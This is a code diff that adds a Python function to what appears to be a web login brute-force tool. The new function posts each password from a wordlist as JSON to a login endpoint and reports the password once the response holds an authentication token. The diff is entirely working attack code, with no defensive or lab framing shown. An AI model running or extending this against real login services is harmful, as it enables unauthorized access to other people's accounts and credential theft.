@@ -29,3 +29,29 @@ def web_login_brute_force(url, username, wordlist, user_field, pass_field, succe
     
     print("[✘] Aucun mot de passe trouvé.")
     return None
+
+def json_login_brute_force(url, username, wordlist):
+    total = len(wordlist)
+    for i, password in enumerate(wordlist):
+        try:
+            response = requests.post(url, json={
+                "email": username,
+                "password": password
+            }, timeout=5)
+
+            progress = ((i + 1) / total) * 100
+
+            if response.status_code == 200:
+                try:
+                    json_resp = response.json()
+                    if "authentication" in json_resp or "token" in json_resp.get("authentication", {}):
+                        print(f"[✔] Password found: {password}")
+                        yield progress, password
+                        return
+                except Exception as e:
+                    pass
+        except Exception as e:
+            print(f"[!] Error: {e}")
+
+        yield ((i + 1) / total) * 100, None
+
